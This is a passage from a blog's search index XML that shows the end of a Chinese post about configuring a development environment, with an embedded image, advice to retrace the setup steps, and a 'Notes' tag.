src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-a973208ca688f669.png" alt="img"></p><p>那么只好按照上述步骤从新捋一遍，找到配置不到位的部分。</p><p>以上是本人在配置环境时的拙见，希望能给即将配置环境的朋友提供方便~</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
